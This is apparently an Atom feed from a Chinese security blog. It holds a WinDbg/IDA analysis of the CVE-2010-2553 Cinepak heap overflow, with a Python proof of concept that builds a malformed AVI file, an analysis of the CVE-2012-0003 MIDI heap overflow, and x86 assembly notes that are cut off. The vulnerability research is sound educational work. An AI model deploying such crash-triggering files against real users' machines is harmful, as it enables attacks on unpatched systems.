<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2019-12-31T09:08:25.553Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2010-2553 CVDecompress堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2010-2553%20CVDecompress%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/</id>
    <published>2019-12-31T09:10:27.505Z</published>
    <updated>2019-12-31T09:08:25.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-2553-CVDecompress堆溢出分析"><a href="#CVE-2010-2553-CVDecompress堆溢出分析" class="headerlink" title="CVE-2010-2553 CVDecompress堆溢出分析"></a>CVE-2010-2553 CVDecompress堆溢出分析</h1><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>Windows Media Player 9.0.0.4503</p></blockquote><h3 id="Windbg符号表配置"><a href="#Windbg符号表配置" class="headerlink" title="Windbg符号表配置"></a>Windbg符号表配置</h3><p><img src="https://i.loli.net/2019/12/28/QHNyEZL9nvK7itO.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srv*c:\Symbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><p>微软Win7以后使用在线下载符号表机制，XP没有支持，所以只能从网上下载符号表离线包，但还是有些报错，可以复制报错路径，在c:\Symbols中创建该路径，然后将对应dll(C:\WINDOWS\Symbols\dll中)复制过来，如图<br><img src="https://i.loli.net/2019/12/28/q82lfNQ7aLEvsdP.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>运行Media Player，windbg附加wmplayer.exe</p><h3 id="定位漏洞位置"><a href="#定位漏洞位置" class="headerlink" title="定位漏洞位置"></a>定位漏洞位置</h3><p>windbg下的gflags.exe可以辅助堆调试<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调试选项</span><br><span class="line"></span><br><span class="line">htc-堆尾检查，在堆块末尾附加额外的标记信息（通常为8字节），用于检查堆块是否发生溢出。</span><br><span class="line">hfc-堆释放检查，在释放堆块时对堆进行各种检查，防止多次释放同一个堆块。</span><br><span class="line">hpc-堆参数检查，对传递给堆管理的参数进行更多的检查。</span><br><span class="line">ust-用户态栈回溯，即将每次调用堆函数的函数调用信息记录到一个数据库中。</span><br><span class="line">htg-堆标志，为堆块增加附加标记，以记录堆块的使用情况或其他信息。</span><br><span class="line">hvc-调用时验证，即每次调用堆函数时都对整个堆进行验证和检查。</span><br><span class="line">hpa-启用页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</span><br></pre></td></tr></table></figure></p><p>windbg中使用!gflag +hpa启用页堆检测<br>g继续运行程序，运行poc.avi<br>触发异常，kb显示调用栈<br><img src="https://i.loli.net/2019/12/28/wegijKQWNkElnHI.png" alt></p><p>ub查看反汇编，进入73b721ae产生异常，因此在73b7cbee处下断点<br><img src="https://i.loli.net/2019/12/28/mhGurxMwElo9YQd.png" alt></p><p>但如果直接下断点到73b7cbee不成功，因为该地址位于iccvid.dll模块中，而iccvid只在解析poc.avi时才会被动态加载，若重新附加进程运行，里面是没有iccvid.dl模块的。</p><p><strong>解决方法：在刚刚附加上进程时，通过”sxe ld:iccvid”命令，设置在iccvid.dll模块首次加载时断下</strong></p><p>重新加载，使用sxe ld:iccvid加载iccvid.dll模块并断下,g继续运行<br>播放poc.avi, lmm iccvid查看模块信息<br>bp下断<br>bl可看出模块列表<br>运行即可到达该断点位置</p><p><img src="https://i.loli.net/2019/12/28/DQUTP4BYCsOkHXx.png" alt></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>IDA分析iccvid.dll,并导入pdb，发现该漏洞位于__stdcall CVDecompress(x, x, x, x, x, x, x)函数中</p><p><img src="https://i.loli.net/2019/12/28/DWwT4rHdMLzCUO5.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B721E1 loc_73B721E1:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E1                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E3                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E7                 <span class="keyword">jb</span>      loc_73B723ED</span><br><span class="line"><span class="symbol">.text:</span>73B721ED                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B721F0                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F3                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F7                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>+<span class="number">2</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721FA                 <span class="keyword">shl</span>     <span class="built_in">eax</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FD                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FF                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72202                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72208                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">esi</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B7220A                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_8+<span class="number">3</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">.text:</span>73B7220D                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span>73B72210                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B72211                 <span class="keyword">push</span>    <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72213                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72214                 <span class="keyword">call</span>    _ULongSub@<span class="number">12</span>    <span class="comment">; ULongSub(x,x,x)</span></span><br><span class="line"><span class="symbol">.text:</span>73B72219                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7221B                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72221                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72223                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72229                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_14], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_18], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222F                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72232                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72235                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72237                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7223A                 <span class="keyword">jle</span>     loc_73B723EA</span><br><span class="line"><span class="symbol">.text:</span>73B72240                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">edi</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/vjZzI4Kbo7JH9qh.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cinepak_codec_data1 = &apos;\x00\x00\x00\x68\x01\x60\x01\x20&apos;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/27fA1yahwgdWtRu.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span>  <span class="comment">;esi指向cinepak_codec_data2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72246                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">16h</span>  <span class="comment">;判断未解压缩数据是否大于等于0x16</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>73B722A9                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]  <span class="comment">;首次为0，循环递增到0x2000</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/dzRLiMa4jB6PqcH.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B723B9 loc_73B723B9:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15A↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B723B9                 <span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B723BD                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_18]</span><br><span class="line"><span class="symbol">.text:</span>73B723C1                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+arg_14], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B723C4                 <span class="keyword">inc</span>     [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>73B723C7                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">2000h</span></span><br><span class="line"><span class="symbol">.text:</span>73B723CE                 <span class="keyword">xor</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span></span><br></pre></td></tr></table></figure><p>每次循环复制0x800字节数据，目标地址递增0x2000，堆块大小为0x6000，令0x1100的数据块超过三个就能造成堆溢出。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">aviHeaders = <span class="string">'\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">padding = <span class="string">'\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'</span></span><br><span class="line">movi_tag = <span class="string">'\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'</span></span><br><span class="line">cinepak_codec_data1 = <span class="string">'\x00\x00\x00\x68\x01\x60\x01\x20'</span></span><br><span class="line">number_of_coded_strips = <span class="string">'\x00\x10'</span> </span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br><span class="line">idx_tag = <span class="string">'\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">avifile = open(<span class="string">'poc.avi'</span>, <span class="string">'wb+'</span>)</span><br><span class="line">avifile.write(aviHeaders)</span><br><span class="line">avifile.write(padding)</span><br><span class="line">avifile.write(movi_tag)</span><br><span class="line">avifile.write(cinepak_codec_data1)</span><br><span class="line">avifile.write(number_of_coded_strips)</span><br><span class="line">avifile.write(cinepak_codec_data2)</span><br><span class="line">avifile.write(idx_tag)</span><br><span class="line"></span><br><span class="line">avifile.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/">https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2010-2553-CVDecompress堆溢出分析&quot;&gt;&lt;a href=&quot;#CVE-2010-2553-CVDecompress堆溢出分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2010-2553 CVDecompress堆溢出分
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2553 CVDecompress堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2012-0003%20MIDI%20%E6%96%87%E4%BB%B6%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    <id>https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出/</id>
    <published>2019-12-31T09:10:27.504Z</published>
    <updated>2019-12-31T09:06:02.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2012-0003-MIDI-文件堆溢出"><a href="#CVE-2012-0003-MIDI-文件堆溢出" class="headerlink" title="CVE-2012-0003 MIDI 文件堆溢出"></a>CVE-2012-0003 MIDI 文件堆溢出</h1><p>该漏洞成因主要是由于 winmm.dll 动态链接库在处理 MIDI 文件的 Note On 和 Note Off 字段没有做限制，导致可以操纵该字段访问堆块之外 1 个字节的内存空间；由于该漏洞过于特殊，所以在分析和利用的时候难度是相当大的。</p><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>IE6   wnimm.dll</p></blockquote><h2 id="MIDI-文件格式"><a href="#MIDI-文件格式" class="headerlink" title="MIDI 文件格式"></a>MIDI 文件格式</h2><p>MIDI 全称 Musical Instrument Digital Interface，是一种乐器数字接口（通过winmm.dll 链接库解析这种格式的文件之后可以播放出音乐）</p><p>总体来说 MIDI 可分为 “头块” 和若干多的 “音轨块”<br><img src="https://i.loli.net/2019/12/28/ACdeJFDR8tj9B6Y.png" alt></p><p>头块结构如下<br><img src="https://i.loli.net/2019/12/28/rpXTb2B1h4KeZED.png" alt></p><p>音轨事件如下<br><img src="https://i.loli.net/2019/12/28/wZozQXrlI1NOFmY.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>poc.html 样本中嵌入了一个音频播放器，由音频播放器来调用 toto.mid 文件播放音频从而触发漏洞</p><p>如果先运行windbg设置堆溢出检测标志，当前IE进程将无法运行poc，需要在命令行先设置gflag再运行windbg。</p><p><img src="https://i.loli.net/2019/12/28/ZKg4o5QFxMaGlkm.png" alt></p><p>F5 运行之后将 poc.html 文件拖入 IE，并且允许运行 ActiveX 控件<br>断下异常，可以看出 esi 指向的地址超出了堆空间，之后被堆页保护捕捉到<br><img src="https://i.loli.net/2019/12/28/C1SEImayw3O2QZV.png" alt></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="https://i.loli.net/2019/12/28/BypUiQqwgMhOVZ4.png" alt></p><p><img src="https://i.loli.net/2019/12/28/ZEVQ5P4FBgkUYJH.png" alt></p><p>shift + F4 对 v2、v9、v11、v13、v21、v23 和 v20 下条件记录断点，记录表达数值<br>v20 int3断点<br>运行poc后查看日志</p><p>分析看出 v11、v13、v21 相等<br>v2 不变，v20 最后才被记录，且指向的地址都在 0x07EC0000 往后的堆中<br>v23 的值，也就是 0x007DB29F 是来自漏洞样本的数据，结合MIDI 格式分析可以知道，9F 代表的就是打开音符（Note On），F 就是通道号</p><p>通道号 F 经过计算之后值为 419，控制着指针的偏移地址，也就是 v24 的值<br>v20 由传入的参数 wParam 控制，midiOutTimerTick函数调用了 midiOutPlayNextPolyEvent 函数，并且把 v6 当作参数传入，而 v6 = gpEmuList，gpEmuList在mseOpen 函数中被引用<br><img src="https://i.loli.net/2019/12/28/BzQLi83RXwCcbZM.png" alt></p><p>最后分析出v20=v6,因为 v6 是堆块的基地址，且这个堆块的大小为 0x400，所以 v20 也为这个 0x400 堆块的基地址</p><p>v25 的指针由 v24 和 v20 相加得出，v20 是堆的基址，而 v24 是样本数据解析运算获得，由于没有限制通道号的大小，导致运算后的偏移地址 v24 为 419，可是堆只有 0x400大小，很显然超出了申请的堆空间，照成了非法访问，故引发了堆页保护异常</p><p>From <a href="https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出/">https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2012-0003-MIDI-文件堆溢出&quot;&gt;&lt;a href=&quot;#CVE-2012-0003-MIDI-文件堆溢出&quot; class=&quot;headerlink&quot; title=&quot;CVE-2012-0003 MIDI 文件堆溢出&quot;&gt;&lt;/a&gt;CVE-2012-0003 
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编-从实模式到保护模式</title>
    <link href="https://kabeor.github.io/x86%E6%B1%87%E7%BC%96%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    <id>https://kabeor.github.io/x86汇编从实模式到保护模式/</id>
    <published>2019-12-31T09:10:04.109Z</published>
    <updated>2019-12-31T09:09:16.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x86汇编-从实模式到保护模式"><a href="#x86汇编-从实模式到保护模式" class="headerlink" title="x86汇编-从实模式到保护模式"></a>x86汇编-从实模式到保护模式</h1><blockquote><p>注释</p></blockquote><p>注释必须以分号“;”开始。</p><blockquote><p>在屏幕上显示文字</p></blockquote><p>文本模式和图形模式是显卡的两种基本工作模式，可以用指令访问显卡，设置它的显示模式。在不同的工作模式下，显卡对显存内容的解释是不同的。</p><p>为了访问显存，也需要使用逻辑地址，也就是采用“段地址：偏移地址”的形式</p><p>Intel的处理器不允许将一个立即数传送到段寄存器，它只允许这样的指令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov 段寄存器，通用寄存器 </span><br><span class="line">mov 段寄存器，内存单元</span><br><span class="line"></span><br><span class="line">         mov ax,0xb800                 ;指向文本模式的显示缓冲区</span><br><span class="line">         mov es,ax</span><br></pre></td></tr></table></figure><blockquote><p>显示字符</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov byte [es:0x00],&apos;L&apos;</span><br><span class="line">mov byte [es:0x01],0x07          ;将属性值0x07传送到下一个内存单元</span><br><span class="line">mov byte [es:0x02],&apos;a&apos;</span><br><span class="line">mov byte [es:0x03],0x07</span><br><span class="line">mov byte [es:0x04],&apos;b&apos;</span><br><span class="line">mov byte [es:0x05],0x07</span><br></pre></td></tr></table></figure><blockquote><p>显示标号的汇编地址</p></blockquote><p>asm编译后，除了生成一个以“.bin”为扩展名的二进制文件，还会生成一个以“.lst”为扩展名的列表文件。这张表列出编译后生成的列表文件内容。</p><p>在编译阶段，每条指令都被计算并赋予了一个汇编地址，就像它们已经被加载到内存中的某个段里一样。实际上，当编译好的程序加载到物理内存后，它在段内的偏移地址和它在编译阶段的汇编地址是相等的。</p><p>源程序的编译是从上往下的，而内存地址的增长是从下往上的（从低地址往高地址方向增长）。</p><blockquote><p>loop</p></blockquote><p>loop指令的功能是重复执行一段相同的代码，处理器在执行它的时候会顺序做两件事： <strong>将寄存器CX的内容减一； 如果CX的内容不为零，转移到指定的位置处执行，否则顺序执行后面的指令。</strong></p><blockquote><p>计算1到100的和</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    xor ax,ax</span><br><span class="line">    mov cx,1</span><br><span class="line">@f:</span><br><span class="line">    add ax,cx</span><br><span class="line">    inc cx</span><br><span class="line">    cmp cx,100</span><br><span class="line">    jle @f</span><br></pre></td></tr></table></figure><blockquote><p>分段、段的汇编地址和段内汇编地址</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Intel处理器要求段在内存中的起始物理地址起码是16字节对齐的。这句话的意思是，必须是16的倍数，或者说该物理地址必须能被16整除。</span><br><span class="line">相应地，汇编语言源程序中定义的各个段，也有对齐方面的要求。具体做法是，在段定义中使用“align=”子句，用于指定某个SECTION的汇编地址对齐方式。比如说，“align=16”就表示段是16字节对齐的，“align=32”就表示段是32字节对齐的。</span><br><span class="line">段的重定位是加载器的工作，它需要知道每个段在用户程序内的位置，即它们分别位于用户程序内的多少字节处。为此，需要在用户程序头部建立一张段重定位表。</span><br></pre></td></tr></table></figure><blockquote><p>实模式下的中断向量表</p></blockquote><p>在实模式下，处理器要求将与该中断有关的程序（指令）的入口点集中存放到内存中从物理地址0x00000开始，到0x003ff结束，共1KB的空间内，这就是所谓的中断向量表（Interrupt Vector Table，IVT）。</p><blockquote><p>初始化8259、RTC和中断向量表</p></blockquote><p>当处理器执行任何一条改变堆栈段寄存器SS的指令时，它会在下一条指令执行完期间禁止中断。</p><p>绝大多数时候，对堆栈的改变是分两步进行的：先改变段寄存器SS的内容，接着又修改堆栈指针寄存器SP的内容。</p><blockquote><p>软 中 断</p></blockquote><p>int3和int 3不是一回事。前者的机器码为CC，后者则是CD 03，这就是通常所说的int n，其操作码为0xCD，第2字节的操作数给出了中断号。</p><p>into是溢出中断指令，机器码为0xCE，也是单字节指令。当处理器执行这条指令时，如果标志寄存器的OF位是1，那么，将产生4号中断。否则，这条指令什么也不做。</p><h2 id="32位保护模式"><a href="#32位保护模式" class="headerlink" title="32位保护模式"></a>32位保护模式</h2><blockquote><p>32位Intel微处理器编程架构</p></blockquote><p>80286和8086不一样的地方在于，它第一次提出了保护模式的概念。在保护模式下，段寄存器中保存的不再是段地址，而是段选择子，真正的段地址位于段寄存器的描述符高速缓存中，是24位的。因此，运行在保护模式下的80286处理器可以访问全部16MB内存。</p><p>在保护模式下，所有的32位处理器都可以访问多达4GB的内存，它们可以工作在分段模型下，每个段的基地址是32位的，段内偏移量也是32位的，因此，段的长度不受限制。在最典型的情况下，可以将整个4GB内存定义成一个段来处理，这就是所谓的平坦模式。在平坦模式下，可以执行4GB范围内的控制转移，也可以使用32位的偏移量访问任何4GB范围内的任何位置。32位保护模式兼容80286的16位保护模式。</p><p>在实模式下，用户程序对内存的访问非常自由，没有任何限制，随随便便就可以修改任何一个内存单元。</p><blockquote><p>全局描述符表</p></blockquote><p>为了让程序在内存中能自由浮动而又不影响它的正常执行，处理器将内存划分成逻辑上的段，并在指令中使用段内偏移地址。在保护模式下，对内存的访问仍然使用段地址和偏移地址，但是，在每个段能够访问之前，必须先进行登记。</p><p>和一个段有关的信息需要8个字节来描述，所以称为段描述符（Segment Descriptor），每个段都需要一个描述符。为了存放这些描述符，需要在内存中开辟出一段空间。在这段空间里，所有的描述符都是挨在一起，集中存放的，这就构成一个描述符表。<br>       最主要的描述符表是全局描述符表（Global Descriptor Table，GDT），所谓全局，意味着该表是为整个软硬件系统服务的。在进入保护模式前，必须要定义全局描述符表。</p><p>描述符不是由用户程序自己建立的，而是在加载时，由操作系统根据你的程序结构而建立的，而用户程序通常是无法建立和修改GDT的。</p><blockquote><p>存储器的段描述符</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">段基地址可以是0～4GB范围内的任意地址，不过，还是建议应当选取那些16字节对齐的地址。尽管对于Intel处理器来说，允许不对齐的地址，但是，对齐能够使程序在访问代码和数据时的性能最大化。这一点，对于那些学过计算机原理，特别是了解内存芯片组织的人来说，是最清楚不过的。</span><br><span class="line">20位的段界限用来限制段的扩展范围。因为访问内存的方法是用段基地址加上偏移量，所以，对于向上扩展的段，如代码段和数据段来说，偏移量是从0开始递增，段界限决定了偏移量的最大值；对于向下扩展的段，如堆栈段来说，段界限决定了偏移量的最小值。</span><br><span class="line">G位是粒度（Granularity）位，用于解释段界限的含义。当G位是“0”时，段界限以字节为单位。此时，段的扩展范围是从1字节到1兆字节（1B～1MB），因为描述符中的界限值是20位的。相反，如果该位是“1”，那么，段界限是以4KB为单位的。这样，段的扩展范围是从4KB到4GB。</span><br><span class="line">S位用于指定描述符的类型（Descriptor Type）。当该位是“0”时，表示是一个系统段；为“1”时，表示是一个代码段或者数据段（堆栈段也是特殊的数据段）。系统段将在以后介绍。</span><br><span class="line">DPL表示描述符的特权级（Descriptor Privilege Level，DPL）。这两位用于指定段的特权级。共有4种处理器支持的特权级别，分别是0、1、2、3，其中0是最高特权级别，3是最低特权级别。刚进入保护模式时执行的代码具有最高特权级0（可以看成是从处理器那里继承来的），这些代码通常都是操作系统代码，因此它的特权级别最高。每当操作系统加载一个用户程序时，它通常都会指定一个稍低的特权级，比如3特权级。不同特权级别的程序是互相隔离的，其互访是严格限制的，而且有些处理器指令（特权指令）只能由0特权级的程序来执行，为的就是安全。</span><br><span class="line">P是段存在位（Segment Present）。P位用于指示描述符所对应的段是否存在。一般来说，描述符所指示的段都位于内存中。但是，当内存空间紧张时，有可能只是建立了描述符，对应的内存空间并不存在，这时，就应当把描述符的P位清零，表示段并不存在。另外，同样是在内存空间紧张的情况下，会把很少用到的段换出到硬盘中，腾出空间给当前急需内存的程序使用（当前正在执行的），这时，同样要把段描述符的P位清零。当再次轮到它执行时，再装入内存，然后将P位置1。</span><br><span 